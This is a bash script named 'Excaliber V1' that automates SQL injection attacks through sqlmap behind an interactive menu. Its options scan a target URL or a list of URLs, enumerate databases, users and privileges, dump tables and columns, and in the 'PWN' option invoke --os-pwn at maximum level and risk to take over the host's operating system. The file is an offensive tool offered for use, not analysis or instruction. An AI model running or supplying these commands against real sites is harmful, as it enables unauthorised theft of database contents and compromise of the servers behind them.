#!/bin/bash
#Codename: Excaliber V1
#Coded By: blkv0lk
## Script (Automated Sqlmap ) is for quick recon. All parmeters are set for quick and accurate retrieval of database information. 


function list(){
read -p "Are you scanning a list or single target [l/t]?" input
if [ $input == 'l' ]
then
read -p  "what is the path to list?:" list
sqlmap -m $list --random-agent --level=3 --risk=2 -o --skip-static --is-dba --dbs --batch --technique=BE
elif [ $input == 't' ] 
then
read -p "what is the target url?:" url
sqlmap -u $url --random-agent --level=3 --risk=2 -o --skip-static --is-dba --dbs --identify-waf --privileges --users

fi

}

function database(){
read -p "<[URL]>:" url   
read -p "<[DB]>:" db
sqlmap -u $url --random-agent -D $db --tables --count --threads 6 #--hex #--no-cast
read -p " What kind of tables to search?:" tables
sqlmap -u $url --random-agent -D $db -T $tables --columns --dump --threads 7    #--hex --batch 

}

function recon(){
read -p " what is the url of target?:" target
sqlmap -u $target --random-agent --level=3 --risk=2 -o -b --is-dba --all --fingerprint --dbs --tables --count --dump --threads 7

}

function pwn(){
read -p "Is DBA Root?:" choice
if [ $choice == 'y' ] 
then
read -p "What is the url?:" root
sqlmap -u "$root" --random-agent --leve=5 --risk=3 --os-pwn
elif [ $choice == 'n' ] 
then
menu
fi   

}

function custom(){
read -p " What is the url?:" url
read -p " What DB you want to search?:" db
read -p " What Table/s you want to search?:" table
sqlmap -u $url --random-agent --level=3 --risk=2 -D $db -T $table --columns --dump --threads 6

} 

function menu(){
echo "[1] Perform Scan Of Target"
echo "[2] Perform Scan Of Database and Tables"
echo "[3] Perform Full Recon Scan Of Database"
echo "[4] Perform PWN on Database(DBA is Root)"
echo "[5] Perform Custom Search"
echo "[0] Exit"
read -p "What is your choice?:" choice
if [ $choice == '1' ] 
then
list
elif [ $choice == '2' ]
then
database
elif [ $choice == '3' ]
then
recon
elif [ $choice == '4' ]
then
pwn
elif [ $choice == '5' ]
then
custom
elif [ $choice == '0' ]
then
clear
exit
fi

}

###############################
###########Banner##############
###############################
echo ""
echo "                /v                                                            "
echo "               /(W                                                            "
echo "              /<M-                                                            "
echo "\~b__________.$|\----------------------------------------------------------. "
echo " >@)=======($( )#H>====================================================----->"
echo "/_p~~~~~~~~~~.$|/----------------------------------------------------------' "
echo "              \<M-                                                            "
echo "               \(B                                                            " 
echo "                \?                                                            "
echo ""
echo "      Getting Injections Ready                     "
echo "      ##Codedname: Excaliber V1"
sleep 1
echo "<===================================>"
echo " Automated Sql Injections via SQLMap "
echo "<===================================>"
echo "[1] Perform Scan Of Target"
echo "[2] Perform Scan Of Database and Tables"
echo "[3] Perform Full Recon Scan Of Database"
echo "[4] Perform PWN on Database(DBA is Root)"
echo "[5] Perform Custom Search"
echo "[0] Exit"
read -p "What is your choice?" choice
if [ $choice == '1' ] 
then
list
elif [ $choice == '2' ]
then
database
elif [ $choice == '3' ]
then
recon
elif [ $choice == '4' ]
then
pwn
elif [ $choice == '5' ]
then
custom
elif [ $choice == '0' ]
then
clear
exit

fi

